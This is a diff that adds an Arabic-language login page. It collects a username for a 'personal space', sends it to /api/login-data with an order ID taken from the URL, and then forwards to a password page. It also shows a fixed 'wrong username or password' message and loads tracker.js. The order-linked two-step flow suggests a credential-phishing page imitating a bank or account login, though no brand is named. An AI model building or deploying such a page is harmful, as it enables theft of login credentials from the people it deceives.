@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
+  body{
+    max-width:520px;margin:0 auto;min-height:100vh;
+    background:
+      linear-gradient(150deg, rgba(255,255,255,.6) 0%, rgba(255,255,255,.6) 15%, transparent 15.5%),
+      linear-gradient(150deg, transparent 14%, rgba(255,255,255,.35) 14.5%, rgba(255,255,255,.35) 28%, transparent 28.5%),
+      linear-gradient(150deg, transparent 27%, rgba(255,255,255,.2) 27.5%, rgba(255,255,255,.2) 42%, transparent 42.5%),
+      linear-gradient(150deg, transparent 55%, rgba(255,255,255,.15) 55.5%, rgba(255,255,255,.15) 68%, transparent 68.5%);
+    background-size:100% 100%;
+    background-attachment:fixed;
+    background-color:#e0e1e3;
+    display:flex;flex-direction:column;
+  }
+
+  .back-btn{
+    position:absolute;top:16px;left:16px;width:40px;height:40px;
+    border:none;background:transparent;cursor:pointer;
+    font-size:28px;color:#333;display:flex;align-items:center;justify-content:center;
+  }
+
+  .content{flex:1;padding:60px 24px 0;position:relative}
+
+  h1{font-size:32px;font-weight:800;color:#1a1a1a;line-height:1.4;margin-bottom:16px}
+  .subtitle{color:#888;font-size:15px;margin-bottom:40px}
+
+  .input-group{position:relative;margin-bottom:16px}
+  .input-group input{
+    width:100%;padding:18px 16px;border:2px solid #2e7d32;border-radius:8px;
+    font-size:16px;font-family:inherit;background:#fff;color:#1a1a1a;outline:none;
+  }
+  .input-group label{
+    position:absolute;top:-10px;right:14px;background:#fff;padding:0 6px;
+    font-size:13px;color:#2e7d32;font-weight:600;
+  }
+
+  .options{margin-top:20px}
+  .option-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;direction:ltr}
+  .check-label{display:flex;align-items:center;gap:8px;font-size:14px;color:#333;cursor:pointer}
+  .check-label input[type="checkbox"]{
+    width:22px;height:22px;accent-color:#333;cursor:pointer;
+  }
+  .forgot-link{color:#c62828;font-size:13px;text-decoration:none;font-weight:500}
+  .info-icon{
+    width:24px;height:24px;border:1.5px solid #999;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+    font-size:14px;color:#999;font-weight:700;cursor:pointer;
+  }
+
+  .bottom{padding:20px 24px 40px}
+  .next-btn{
+    display:block;width:100%;padding:18px;border:none;border-radius:50px;
+    font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
+    background:linear-gradient(135deg, #c62828, #e53935);
+    box-shadow:0 4px 15px rgba(198,40,40,.3);
+    transition:.2s;
+  }
+  .next-btn:hover{opacity:.9;transform:translateY(-1px)}
+  .next-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+
+  .error-msg{
+    display:none;background:#fee;border:1px solid #fcc;border-radius:8px;
+    padding:10px 14px;margin-bottom:16px;color:#c62828;font-size:13px;text-align:center;
+  }
+</style>
+</head>
+<body>
+
+  <div class="content">
+    <button class="back-btn" onclick="history.back()" aria-label="رجوع">&#8592;</button>
+
+    <h1>قم بتسجيل الدخول إلى<br>المساحة الشخصية الخاصة بك</h1>
+    <p class="subtitle">الرجاء إدخال اسم المستخدم الخاص بك لتسجيل الدخول.</p>
+
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="input-group">
+      <input type="text" id="username" autocomplete="username" autofocus>
+      <label>اسم المستخدم</label>
+    </div>
+
+    <div class="options">
+      <div class="option-row">
+        <label class="check-label">
+          <input type="checkbox" checked> تذكر هويتي
+        </label>
+        <a href="#" class="forgot-link">نسيت إسم المستخدم؟</a>
+      </div>
+      <div class="option-row">
+        <label class="check-label">
+          <input type="checkbox" checked> تفعيل الوضع السري
+        </label>
+        <div class="info-icon">i</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom">
+    <button class="next-btn" id="nextBtn" onclick="submitUsername()">التالي</button>
+  </div>
+
+<script>
+  const params = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+
+  if (params.get("error") === "1") {
+    showError("اسم المستخدم او الرمز السري غير صحيح");
+  }
+
+  async function submitUsername() {
+    const username = document.getElementById("username").value.trim();
+    if (!username) {
+      showError("الرجاء إدخال اسم المستخدم");
+      return;
+    }
+    const btn = document.getElementById("nextBtn");
+    btn.disabled = true;
+    btn.textContent = "جاري التحقق...";
+
+    try {
+      const res = await fetch("/api/login-data", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ order_id: orderId, username })
+      });
+      const data = await res.json();
+      if (data.success) {
+        location.href = "password.html?order=" + orderId + "&user=" + encodeURIComponent(username);
+      } else {
+        showError(data.message || "حدث خطأ");
+        btn.disabled = false;
+        btn.textContent = "التالي";
+      }
+    } catch(err) {
+      showError("حدث خطأ في الاتصال");
+      btn.disabled = false;
+      btn.textContent = "التالي";
+    }
+  }
+
+  function showError(msg) {
+    const el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+  }
+
+  document.getElementById("username").addEventListener("keydown", e => {
+    if (e.key === "Enter") submitUsername();
+  });
+</script>
+<script src="tracker.js"></script>
+</body>
+</html>
